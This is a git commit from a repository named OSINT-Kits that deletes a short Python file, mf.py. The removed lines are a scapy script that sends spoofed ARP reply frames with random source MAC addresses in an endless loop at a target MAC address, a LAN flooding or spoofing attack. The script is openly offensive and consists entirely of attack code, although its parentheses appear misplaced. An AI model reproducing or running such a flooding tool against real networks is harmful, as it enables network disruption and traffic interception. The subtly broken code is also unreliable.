14c58f9da0d0db67645e2ae83fc97c94f3a47ed6
OSINT-Kits <88448048+OSINT-Kits@users.noreply.github.com>
2021-08-05 22:20:39 +0300

    Delete mf.py

--- mf.py
+++
@@ -1,4 +0,0 @@
-from scapy.all import *
-
-while 1:
-    sendp(Ether(src=RandMAC(),dst=input("[*] Enter The Target's Mac Address")/ARP(op=2, psrc="0.0.0.0", hwdst=input("[*] Enter Your Mac Address"))/Padding(load="X"*18)))
